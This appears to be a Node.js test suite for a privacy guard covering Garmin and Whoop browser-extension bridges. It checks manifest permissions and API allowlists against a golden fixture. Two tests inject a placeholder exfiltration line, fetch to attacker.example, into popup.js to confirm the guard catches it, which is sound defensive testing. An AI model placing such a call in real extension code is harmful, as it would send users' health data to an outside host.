import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { copyFileSync, existsSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = dirname(HERE);
const SCRIPT = join(HERE, "check-bridge-privacy-surface.mjs");
const GOLDEN = join(HERE, "fixtures/bridge-privacy-surface.json");
const POPUP = join(REPO, "packages/garmin-bridge/popup.js");
const WHOOP_POPUP = join(REPO, "packages/whoop-bridge/popup.js");
const WHOOP_CONTENT = join(REPO, "packages/whoop-bridge/content.js");

const runGuard = () =>
  spawnSync("node", [SCRIPT], {
    cwd: REPO,
    encoding: "utf8",
  });

describe("bridge privacy surface guard", () => {
  it("passes against the checked-in golden", () => {
    const result = runGuard();

    assert.equal(result.status, 0, result.stderr || result.stdout);
    assert.match(result.stdout, /matches golden/);
  });

  it("fails when the manifest permissions drift from the golden", () => {
    const original = readFileSync(GOLDEN, "utf8");
    const tampered = JSON.parse(original);
    tampered["garmin-bridge"].manifest.permissions = [
      "storage",
      "tabs",
      "webRequest",
      "alarms",
    ];
    writeFileSync(GOLDEN, JSON.stringify(tampered, null, 2));

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
    } finally {
      writeFileSync(GOLDEN, original);
    }
  });

  it("fails on an absolute-URL fetch in popup.js", () => {
    const original = readFileSync(POPUP, "utf8");
    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
    writeFileSync(POPUP, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /absolute-URL fetch/);
    } finally {
      writeFileSync(POPUP, original);
    }
  });

  it("fails when whoop's ALLOWED_PREFIXES gains an entry", () => {
    // whoop declares its read allowlist as a plain string array
    // (ALLOWED_PREFIXES), not the {method, pattern} shape. Until the
    // extractor learned that shape, whoop's allowed_paths was [] in the
    // golden and this widening produced zero CI failure — while the privacy
    // policy asserted the allowlist as a durable property.
    const original = readFileSync(WHOOP_CONTENT, "utf8");
    const tampered = original.replace(
      '"/health-service/v2/stress-bff",',
      '"/health-service/v2/stress-bff",\n  "/membership-service/v1/affiliate",'
    );
    assert.notEqual(tampered, original, "fixture anchor no longer present");
    writeFileSync(WHOOP_CONTENT, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /drifted from golden/);
      assert.match(result.stderr, /membership-service/);
    } finally {
      writeFileSync(WHOOP_CONTENT, original);
    }
  });

  it("covers whoop-bridge popup.js for absolute-URL exfil", () => {
    const original = readFileSync(WHOOP_POPUP, "utf8");
    const tampered = `${original}\n// fixture line\nfetch("https://attacker.example/exfil");\n`;
    writeFileSync(WHOOP_POPUP, tampered);

    try {
      const result = runGuard();
      assert.equal(result.status, 1);
      assert.match(result.stderr, /absolute-URL fetch/);
      assert.match(result.stderr, /whoop-bridge/);
    } finally {
      writeFileSync(WHOOP_POPUP, original);
    }
  });

  it("verifies the script is executable directly", () => {
    // Smoke test that the import side-effect isn't broken.
    assert.doesNotThrow(() => execFileSync("node", [SCRIPT], { cwd: REPO }));
  });

  it("fixture allowed_paths count matches each bridge's source allowlist count", () => {
    // Mechanical drift catcher: if a future PR adds an allowlist entry but
    // forgets the golden, this assertion fires before the guard's
    // run-comparison even gets to surface the diff. Mirrors §2.2b of the
    // train2go-zones-sync change.
    //
    // Two allowlist shapes are in use and BOTH must be counted. Counting
    // only the {method, pattern} shape made this assertion vacuously true
    // for whoop (0 entries counted === 0 entries in a golden that was
    // itself empty), which is precisely how whoop's allowlist escaped the
    // golden in the first place.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    for (const bridge of Object.keys(golden)) {
      // Content-script bridges keep the allowlist in content.js; SW-direct
      // bridges (garmin, train2go, tanita, trainingpeaks) keep it in
      // background.js. Cross-count against whichever the guard reads.
      const contentPath = join(REPO, "packages", bridge, "content.js");
      const backgroundPath = join(REPO, "packages", bridge, "background.js");
      const sourcePath = existsSync(contentPath) ? contentPath : backgroundPath;
      if (!existsSync(sourcePath)) {
        // Bridges without any allowlist source declare an empty allowlist in
        // the golden; nothing to cross-count.
        assert.deepEqual(golden[bridge].allowed_paths, []);
        continue;
      }
      const src = readFileSync(sourcePath, "utf8");

      const patternStart = src.indexOf("const ALLOWED = [");
      const prefixStart = src.indexOf("const ALLOWED_PREFIXES = [");
      assert.ok(
        patternStart >= 0 || prefixStart >= 0,
        `${bridge}: ${sourcePath} declares neither ALLOWED nor ALLOWED_PREFIXES`
      );

      const start = patternStart >= 0 ? patternStart : prefixStart;
      const end = src.indexOf("];", start);
      assert.ok(
        end >= 0,
        `${bridge}: allowlist array has no closing "];" — array was probably truncated`
      );
      const body = src.slice(start, end + 2);

      const sourceCount =
        patternStart >= 0
          ? body
              .split("\n")
              .filter(
                (l) => /method:\s*"[A-Z]+"/.test(l) && /pattern:\s*\//.test(l)
              ).length
          : [...body.matchAll(/"([^"\\\n]+)"/g)].length;

      const fixtureCount = golden[bridge].allowed_paths.length;
      assert.ok(
        sourceCount > 0,
        `${bridge}: counted 0 allowlist entries in ${sourcePath} — the counter does not understand this declaration's shape, so this assertion would pass vacuously`
      );
      assert.equal(
        fixtureCount,
        sourceCount,
        `${bridge}: fixture has ${fixtureCount} allowed_paths but the source allowlist has ${sourceCount} entries`
      );
    }
  });

  it("records whoop's GET-only prefix allowlist, matching content.js exactly", () => {
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    const entries = golden["whoop-bridge"].allowed_paths;
    assert.ok(entries.length > 0, "whoop allowed_paths must not be empty");
    // Every whoop read is gated to GET by isAllowed(); the golden records
    // that, and records `prefix` (not `pattern`) so swapping the matching
    // semantics is itself visible drift.
    for (const e of entries) {
      assert.equal(e.method, "GET");
      assert.ok(typeof e.prefix === "string" && e.prefix.startsWith("/"));
      assert.equal(e.pattern, undefined);
    }
    const src = readFileSync(WHOOP_CONTENT, "utf8");
    for (const e of entries) {
      assert.ok(
        src.includes(`"${e.prefix}"`),
        `golden lists ${e.prefix} but content.js does not declare it`
      );
    }
  });
});

void copyFileSync;
